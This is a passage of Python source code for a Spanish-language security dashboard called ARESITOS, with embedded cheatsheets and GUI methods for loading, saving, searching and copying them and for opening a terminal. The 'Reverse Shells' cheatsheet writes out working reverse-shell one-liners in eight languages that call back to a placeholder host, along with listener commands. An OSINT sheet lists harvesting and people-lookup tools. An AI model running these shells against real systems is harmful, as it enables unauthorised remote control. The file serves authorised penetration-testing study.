            "Reverse Shells": """
# REVERSE SHELLS CHEATSHEET
# NOTA DE SEGURIDAD: Solo para uso en auditorías autorizadas

## Bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'
0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

## Netcat
nc -e /bin/sh 10.0.0.1 4242          # Con -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f

# Python
# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP  
# php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
# <?php system('bash -c "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"'); ?>

# Perl
# perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");system("/bin/sh -i");};'

# Ruby
# ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;system sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Java
# r = Runtime.getRuntime()
# p = r.system(["/bin/bash","-c","system 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
# p.waitFor()

# PowerShell
# powershell -NoP -NonI -W Hidden -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (command $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Listeners
# nc -lvnp 4242                     # Netcat listener
# socat file:`tty`,raw,echo=0 tcp-listen:4242  # Socat listener
# rlwrap nc -lvnp 4242              # Con readline
""",
            
            " OSINT": """
# OSINT (Open Source Intelligence) CHEATSHEET

## Búsqueda de Dominios
whois domain.com                  # Información WHOIS
dig domain.com                    # DNS lookup
nslookup domain.com              # DNS lookup alternativo
host domain.com                  # Host lookup
theHarvester -d domain.com -b google  # Email harvesting

## Subdominios
sublist3r -d domain.com          # Enumeración de subdominios
amass enum -d domain.com         # Mapeo de subdominios
gobuster dns -d domain.com -w wordlist.txt  # Brute force DNS

## Google Dorks
site:domain.com                  # Páginas de un sitio
filetype:pdf site:domain.com     # PDFs del sitio
inurl:admin site:domain.com      # URLs con "admin"
intitle:"index of" site:domain.com  # Directorios listados
cache:domain.com                 # Caché de Google

## Shodan
shodan search apache             # Buscar Apache servers
shodan search port:22            # SSH servers
shodan search country:ES         # Dispositivos en España
shodan search org:"Company Name" # Por organización

## Redes Sociales
sherlock username                # Buscar username en redes
social-analyzer -u username      # Análisis de redes sociales
twint -u username                # Twitter scraping

## Metadatos
exiftool image.jpg               # Metadatos de imagen
metagoofil -d domain.com -t pdf  # Metadatos de documentos
foca                             # Fingerprinting Organizations

## Herramientas Web
archive.org                      # Wayback Machine
censys.io                        # Motor de búsqueda de dispositivos
builtwith.com                    # Tecnologías de sitios web
netcraft.com                     # Información de hosting

## Phone Numbers
phoneinfoga scan -n +34123456789 # Información de teléfonos
truecaller                       # Base de datos de números
""",
            
            "Log Analysis": """
# LOG ANALYSIS CHEATSHEET

## Ubicaciones de Logs Comunes
/var/log/auth.log                # Autenticación (Debian/Ubuntu)
/var/log/secure                  # Autenticación (RedHat/CentOS)
/var/log/syslog                  # Mensajes del sistema
/var/log/messages                # Mensajes generales
/var/log/kern.log                # Kernel messages
/var/log/apache2/access.log      # Apache access logs
/var/log/apache2/error.log       # Apache error logs
/var/log/nginx/access.log        # Nginx access logs
/var/log/nginx/error.log         # Nginx error logs

## Comandos de Análisis
tail -f /var/log/auth.log        # Seguimiento en tiempo real
grep "Failed password" /var/log/auth.log  # Intentos fallidos
grep "Accepted" /var/log/auth.log # Login exitosos
awk '{print $1}' access.log | sort | uniq -c | sort -nr  # IPs más frecuentes

## SSH Attack Detection
grep "Invalid user" /var/log/auth.log     # Usuarios inválidos
grep "Failed password" /var/log/auth.log | grep -o '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}' | sort | uniq -c | sort -nr  # IPs con más fallos

## Web Log Analysis
awk '{print $7}' access.log | sort | uniq -c | sort -nr  # URLs más solicitadas
awk '{print $1}' access.log | sort | uniq -c | sort -nr  # IPs más activas
grep " 404 " access.log          # Errores 404
grep " 500 " access.log          # Errores del servidor

## Log Filtering by Time
awk '$0 ~ /Dec 25 1[0-5]:/ {print}' /var/log/syslog  # Entre 10:00-15:59
sed -n '/Dec 25 10:00/,/Dec 25 15:00/p' /var/log/syslog  # Rango horario

## Security Events
grep -i "attack\\|hack\\|exploit\\|malware" /var/log/syslog
grep -E "(sudo|su):" /var/log/auth.log   # Uso de sudo/su
grep "session opened" /var/log/auth.log   # Sesiones abiertas

## Log Rotation
logrotate -d /etc/logrotate.conf # Dry run de rotación
journalctl --since "2023-01-01" # Logs desde fecha
journalctl -u ssh                # Logs de servicio específico
""",
        }
    
    def cargar_cheatsheet(self, event):
        """Cargar cheatsheet seleccionado desde archivo."""
        try:
            import os
            
            selection = self.categorias_chuletas.curselection()
            if selection:
                categoria = self.categorias_chuletas.get(selection[0])
                self.categoria_actual = categoria
                
                # Verificar si es un mensaje de error o vacío
                if categoria.startswith("DIR") or categoria.startswith("LIST") or categoria.startswith("[FAIL]"):
                    self.cheatsheet_text.delete(1.0, tk.END)
                    self.cheatsheet_text.insert(1.0, f"# CHEATSHEETS\n\n{categoria}\n\nPor favor, revise la carpeta de cheatsheets.")
                    return
                
                # Extraer nombre del archivo (quitar emoji y espacios)
                nombre_archivo = categoria.split(" ", 1)[1] if " " in categoria else categoria
                nombre_archivo = nombre_archivo.replace("NOTE ", "").replace("📄 ", "")
                
                # Obtener directorio de cheatsheets
                directorio_proyecto = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
                cheatsheets_dir = os.path.join(directorio_proyecto, "data", "cheatsheets")
                
                # Buscar archivo con extensión .txt o .md
                archivos_posibles = [
                    f"{nombre_archivo}.txt",
                    f"{nombre_archivo}.md"
                ]
                
                archivo_encontrado = None
                for archivo in archivos_posibles:
                    archivo_path = os.path.join(cheatsheets_dir, archivo)
                    if os.path.exists(archivo_path):
                        archivo_encontrado = archivo_path
                        break
                
                # Buscar archivos que contengan el nombre parcialmente
                if not archivo_encontrado:
                    if os.path.exists(cheatsheets_dir):
                        archivos = os.listdir(cheatsheets_dir)
                        for archivo in archivos:
                            if archivo.endswith(('.txt', '.md')) and nombre_archivo.lower() in archivo.lower():
                                archivo_encontrado = os.path.join(cheatsheets_dir, archivo)
                                break
                
                if archivo_encontrado:
                    with open(archivo_encontrado, 'r', encoding='utf-8', errors='ignore') as f:
                        contenido = f.read()
                        self.cheatsheet_text.delete(1.0, tk.END)
                        self.cheatsheet_text.insert(1.0, contenido)
                else:
                    self.cheatsheet_text.delete(1.0, tk.END)
                    self.cheatsheet_text.insert(1.0, f"# CHEATSHEET: {nombre_archivo}\n\nArchivo no encontrado en la carpeta cheatsheets.\n\nPuedes crear este cheatsheet editando este contenido y guardando.")
                    
        except Exception as e:
            print(f"Error cargando cheatsheet: {e}")
            self.cheatsheet_text.delete(1.0, tk.END)
            self.cheatsheet_text.insert(1.0, f"Error cargando cheatsheet: {str(e)}")
    
    def guardar_cheatsheet(self):
        """Guardar cambios en el cheatsheet actual."""
        try:
            import os
            
            if not hasattr(self, 'categoria_actual'):
                print("No hay categoría seleccionada")
                return
                
            # Mapear nombre de categoría a archivo
            archivo_map = {
                "Nmap - Escaneo de Puertos": "nmap_basico.txt",
                "Metasploit Framework": "metasploit_framework.txt",
                "Comandos Linux Seguridad": "comandos_linux.txt",
                "Shells Inversas": "shells_inversas.txt",
                "John the Ripper": "john_the_ripper.txt",
                "Burp Suite": "burp_suite.txt",
                "Análisis de Logs": "analisis_logs.txt",
                "OSINT Básico": "osint_basico.txt"
            }
            
            archivo = archivo_map.get(self.categoria_actual, f"{self.categoria_actual.lower().replace(' ', '_')}.txt")
            archivo_path = os.path.join("data", "cheatsheets", archivo)
            
            # Crear directorio si no existe
            os.makedirs(os.path.dirname(archivo_path), exist_ok=True)
            
            # Guardar contenido
            contenido = self.cheatsheet_text.get(1.0, tk.END).rstrip()
            with open(archivo_path, 'w', encoding='utf-8') as f:
                f.write(contenido)
                
            # Feedback visual
            self.btn_guardar.configure(text="Guardado", bg="#5cb85c")
            self.after(2000, lambda: self.btn_guardar.configure(text="Guardar Cambios", bg=self.colors['button_bg']))
            
        except Exception as e:
            print(f"Error guardando cheatsheet: {e}")
            self.btn_guardar.configure(text="Error al guardar", bg="#d9534f")
            self.after(2000, lambda: self.btn_guardar.configure(text="Guardar Cambios", bg=self.colors['button_bg']))
    
    def copiar_comando_seleccionado(self):
        """Copiar comando seleccionado al portapapeles."""
        try:
            if self.cheatsheet_text.selection_get():
                selected_text = self.cheatsheet_text.selection_get()
                self.clipboard_clear()
                self.clipboard_append(selected_text)
                # Mostrar feedback visual
                self.btn_copiar.configure(text="Copiado", bg="#5cb85c")
                self.after(2000, lambda: self.btn_copiar.configure(text="Copiar Comando", bg=self.colors['button_bg']))
        except tk.TclError:
            # No hay texto seleccionado
            pass
        except Exception as e:
            print(f"Error copiando comando: {e}")
    
    def buscar_en_cheatsheet(self):
        """Buscar texto en el cheatsheet actual."""
        try:
            search_term = self.entry_buscar.get().strip()
            if not search_term:
                return
            
            # Limpiar búsquedas anteriores
            self.cheatsheet_text.tag_remove("search", "1.0", tk.END)
            
            # Buscar y resaltar
            start_pos = "1.0"
            found_count = 0
            
            while True:
                pos = self.cheatsheet_text.search(search_term, start_pos, tk.END, nocase=True)
                if not pos:
                    break
                
                end_pos = f"{pos}+{len(search_term)}c"
                self.cheatsheet_text.tag_add("search", pos, end_pos)
                start_pos = end_pos
                found_count += 1
            
            # Configurar tag de resaltado
            self.cheatsheet_text.tag_configure("search", background="#ffff00", foreground="#000000")
            
            # Ir al primer resultado
            if found_count > 0:
                first_pos = self.cheatsheet_text.search(search_term, "1.0", tk.END, nocase=True)
                self.cheatsheet_text.see(first_pos)
                self.btn_buscar.configure(text=f"{found_count} encontrados")
                self.after(3000, lambda: self.btn_buscar.configure(text="Buscar"))
            else:
                self.btn_buscar.configure(text="No encontrado")
                self.after(2000, lambda: self.btn_buscar.configure(text="Buscar"))
                
        except Exception as e:
            print(f"Error en búsqueda: {e}")
    
    def abrir_terminal_kali(self):
        """Abrir terminal real de Kali Linux con configuración optimizada."""
        import subprocess
        import platform
        import os
        import shutil
        
        print("TERMINAL Intentando abrir terminal de Kali Linux...")
        
        try:
            if platform.system() == "Linux":
                # Lista de terminales disponibles en Kali Linux (orden de preferencia)
                terminales_kali = [
                    "qterminal",        # QTerminal (predeterminado en Kali)
                    "gnome-terminal",   # GNOME Terminal
                    "konsole",          # KDE Konsole
                    "xfce4-terminal",   # XFCE Terminal
                    "mate-terminal",    # MATE Terminal
                    "terminator",       # Terminator
                    "tilix",           # Tilix
                    "lxterminal",      # LXDE Terminal
                    "alacritty",       # Alacritty moderno
                    "kitty",           # Kitty moderno
                    "x-terminal-emulator", # Alternativa Debian
                    "xterm"            # Básico siempre disponible
                ]
                
                # Buscar primer terminal disponible
                terminal_encontrado = None
                for terminal in terminales_kali:
                    if shutil.which(terminal):
                        terminal_encontrado = terminal
                        print(f"ESCANEO Terminal encontrado: {terminal}")
                        break
                
                if terminal_encontrado:
                    # Construir comando según el terminal
                    if terminal_encontrado == "gnome-terminal":
                        cmd = ["gnome-terminal", "--title=ARESITOS Kali Terminal"]
                    elif terminal_encontrado == "qterminal":
                        cmd = ["qterminal", "-e", "/bin/bash"]
                    elif terminal_encontrado == "konsole":
                        cmd = ["konsole", "--title", "ARESITOS Kali Terminal"]
                    elif terminal_encontrado == "xfce4-terminal":
                        cmd = ["xfce4-terminal", "--title=ARESITOS Kali Terminal"]
                    elif terminal_encontrado == "xterm":
                        cmd = ["xterm", "-title", "ARESITOS Kali Terminal", "-bg", "black", "-fg", "green"]
                    else:
                        # Para otros terminales, comando básico
                        cmd = [terminal_encontrado]
                    
                    # Ejecutar terminal
                    proceso = subprocess.Popen(
                        cmd,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        preexec_fn=getattr(os, 'setsid', None)  # Solo si existe setsid
                    )
                    
                    print(f"OK Terminal {terminal_encontrado} abierto (PID: {proceso.pid})")
                    self.mostrar_notificacion(f"Terminal {terminal_encontrado} iniciado", "success")
                    return True
                    
                else:
                    print("ERROR No se encontró ningún terminal disponible")
                    self.mostrar_notificacion("No hay terminal disponible", "error")
                    return False
                    
            elif platform.system() == "Windows":
                # En Windows, intentar WSL con Kali o alternativas
                opciones = [
                    (["wsl", "-d", "kali-linux"], "WSL Kali Linux"),
                    (["wsl", "-d", "Ubuntu"], "WSL Ubuntu"),  
                    (["wsl"], "WSL por defecto"),
                    (["wt", "wsl", "-d", "kali-linux"], "Windows Terminal con Kali"),
                    (["wt"], "Windows Terminal"),
                    (["powershell"], "PowerShell"),
                    (["cmd"], "Command Prompt")
                ]
                
                for cmd, nombre in opciones:
                    try:
                        subprocess.Popen(cmd, shell=True)
                        print(f"OK {nombre} abierto exitosamente")
                        self.mostrar_notificacion(f"{nombre} iniciado", "success")
                        return True
                    except:
                        continue
                
                print("ERROR No se pudo abrir ningún terminal en Windows")
                self.mostrar_notificacion("No hay terminal disponible", "error")
                return False
                
            else:
                # macOS u otros sistemas
                try:
                    subprocess.Popen(["open", "-a", "Terminal"])
                    print("OK Terminal de macOS abierto")
                    self.mostrar_notificacion("Terminal iniciado", "success")
                    return True
                except:
                    print(f"ERROR Sistema {platform.system()} no soportado")
                    self.mostrar_notificacion("SO no soportado", "error")
                    return False
                    
        except Exception as e:
            print(f"ERROR abriendo terminal: {e}")
            self.mostrar_notificacion("Error abriendo terminal", "error")
            return False
    
    def mostrar_notificacion(self, mensaje, tipo="info"):
        """Mostrar notificación temporal en la interfaz."""
        try:
            # Crear ventana de notificación temporal
            ventana_notif = tk.Toplevel(self)
            ventana_notif.title("ARESITOS")
            ventana_notif.geometry("400x100")
            ventana_notif.resizable(False, False)
            
            # Configurar icono de la ventana de notificación usando gestor centralizado
            try:
                configurar_icono_ventana(ventana_notif, "ARESITOS - Notificación del Sistema")
            except Exception:
                pass  # Continuar sin icono si hay problemas
            
            # Configurar colores según tipo
            colores = {
                "info": {"bg": "#d4edda", "fg": "#155724"},
                "warning": {"bg": "#fff3cd", "fg": "#856404"},
                "error": {"bg": "#f8d7da", "fg": "#721c24"}
            }
            
            color = colores.get(tipo, colores["info"])
            ventana_notif.configure(bg=color["bg"])
            
            # Etiqueta del mensaje
            label = tk.Label(
                ventana_notif,
                text=mensaje,
                bg=color["bg"],
                fg=color["fg"],
                font=("Arial", 11, "bold"),
                wraplength=350
            )
            label.pack(expand=True, fill="both", padx=10, pady=10)
            
            # Centrar ventana
            ventana_notif.update_idletasks()
            x = (ventana_notif.winfo_screenwidth() // 2) - (400 // 2)
            y = (ventana_notif.winfo_screenheight() // 2) - (100 // 2)
            ventana_notif.geometry(f"400x100+{x}+{y}")
            
            # Auto cerrar después de 3 segundos
            ventana_notif.after(3000, ventana_notif.destroy)
            
        except Exception as e:
            print(f"Error mostrando notificación: {e}")
    
    def _actualizar_terminal_seguro(self, texto, modo="append"):
        """Actualizar terminal_output de forma segura desde threads."""
        def _update():
            try:
                if hasattr(self, 'terminal_output') and self.terminal_output.winfo_exists():
                    if modo == "clear":
                        self.terminal_output.delete(1.0, tk.END)
                    elif modo == "replace":
                        self.terminal_output.delete(1.0, tk.END)
                        self.terminal_output.insert(1.0, texto)
                    elif modo == "append":
                        self.terminal_output.insert(tk.END, texto)
                    elif modo == "insert_start":
                        self.terminal_output.insert(1.0, texto)
                    self.terminal_output.see(tk.END)
                    if hasattr(self.terminal_output, 'update'):
                        self.terminal_output.update()
            except (tk.TclError, AttributeError):
                pass  # Widget ya no existe o ha sido destruido
        
        # Programar la actualización para el hilo principal
        try:
            self.after_idle(_update)
        except (tk.TclError, AttributeError):
            pass  # Ventana ya destruida
    
    def destroy(self):
        """Limpiar recursos al destruir la vista."""
        self.detener_actualizacion_metricas()
        super().destroy()

# RESUMEN: Dashboard optimizado para expertos en ciberseguridad con:
# - Métricas específicas actualizadas cada 60 segundos
# - Información de IPs local y pública
# - Interfaces de red detalladas
# - Terminal integrado con comandos rápidos
# - Consumo de recursos optimizado
